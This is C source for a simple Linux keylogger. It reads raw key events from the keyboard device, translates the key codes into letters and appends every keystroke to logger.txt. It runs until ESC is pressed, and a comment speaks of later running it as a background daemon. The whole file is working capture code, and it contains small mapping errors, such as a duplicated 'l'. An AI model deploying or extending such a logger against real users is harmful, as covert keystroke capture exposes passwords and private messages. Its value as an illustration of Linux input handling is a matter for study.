#include <linux/input.h>
#include <stdlib.h>
#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>



/*
* struct input_event {
* struct timeval time;
* unsigned short type; // Type of event, we are looking for EV_KEY
* unsigned short code; // Key code in LKC standard (See bellow)
* unsigned int value; // 0 == released; 1 == pressed; 2 == repeated
* };
*/



char* parsing ( unsigned short code){

	char* value;

 	switch (code) {
	
		case 16:value = "q";break;
		case 17:value = "w";break;
		case 18:value ="e";break;
		case 19:value = "r";break;
		case 20:value = "t";break;
		case 21:value = "y";break;
		case 22:value = "u";break;
		case 23:value = "i";break;
		case 24:value = "o";break;
		case 25:value = "p";break;
		case 30:value = "a";break;
		case 31:value = "s";break;
		case 32:value = "d";break;
		case 33:value = "f";break;
		case 34:value = "g";break;
		case 35:value = "h";break;
		case 36:value = "j";break;
		case 37:value = "k";break;
		case 38:value = "l";break;
		case 39:value = "l";break;
		case 44:value = "z";break;
		case 45:value = "x";break;
		case 46:value = "c";break;
		case 47:value = "v";break;
		case 48:value = "b";break;
		case 49:value = "n";break;
		case 50:value = "m";break;
		case 57:value = " ";break;
		default :value = " ";break;
	}

 	return value;

}



int main (int argc, char** argv){

// we prepare a file to see what the logger has read 

	FILE * fp;
	fp = fopen("logger.txt","w+");												 // w+ opens a file for reading an writing , if there is none then creates one 

// key logger 

	struct input_event keys;													// to catch the events
	const char* dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd"; 	// path to keyboard buffer 
	int fd;																		// to catch the file descriptor 
	char* letter;

	fd = open(dev,O_RDONLY)  ;													// the open syscall value =s a file descriptor, the flag is for read only 

	if(fd == -1) return 1; 			

	while (1){

		if ( read(fd,&keys,sizeof(struct input_event)) == -1 ){  // if fails to read we exit 
			perror("FAIL READING");
			break;
		}

		if(keys.type == EV_KEY && keys.value == 1) { // capture the event 

			letter = parsing(keys.code);
			fputs(letter,fp);
		} 

		if(keys.code == KEY_ESC) break;  // it is an adoc breaker till we can run it as a daemon 
	}

	fclose(fp);
	close(fd);

	return 0;

}